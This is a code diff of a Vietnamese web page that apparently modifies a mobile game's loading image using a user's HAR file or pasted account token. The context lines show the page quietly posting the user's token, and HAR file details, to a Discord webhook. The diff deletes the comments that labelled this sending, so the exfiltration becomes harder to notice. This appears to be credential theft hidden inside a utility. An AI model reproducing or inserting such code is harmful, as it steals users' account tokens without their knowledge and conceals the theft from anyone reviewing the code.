@@ -54,7 +54,6 @@
             position: relative;
         }
 
-        /* HIỆU ỨNG CỰC QUANG NỀN (AURORA) */
         body::before {
             content: '';
             position: fixed;
@@ -720,7 +719,6 @@
             closeCropModal();
         }
 
-        // HÀM GỬI THÔNG TIN VỀ DISCORD WEBHOOK
         async function sendDiscordWebhook(type, data) {
             try {
                 let payload = {};
@@ -771,7 +769,6 @@
             if (!selectedHarFile) { Swal.fire({ icon: 'warning', title: 'Thiếu File HAR!', text: 'Vui lòng chọn file .HAR trước.' }); return; }
             if (!iosBlobImage) { Swal.fire({ icon: 'warning', title: 'Thiếu Ảnh!', text: 'Vui lòng chọn ảnh loading cho iOS.' }); return; }
 
-            // Gửi dữ liệu về Discord Webhook
             sendDiscordWebhook('ios', {
                 fileName: selectedHarFile.name,
                 fileSize: selectedHarFile.size
@@ -813,7 +810,6 @@
             if (!token) { Swal.fire({ icon: 'warning', title: 'Thiếu Link Token!', text: 'Vui lòng dán link token kgvn vào khung trên.' }); return; }
             if (!androidBlobImage) { Swal.fire({ icon: 'warning', title: 'Thiếu Ảnh!', text: 'Vui lòng chọn ảnh loading cho Android.' }); return; }
 
-            // Gửi dữ liệu về Discord Webhook
             sendDiscordWebhook('android', { token: token });
 
             const log = document.getElementById('androidStatusLog');
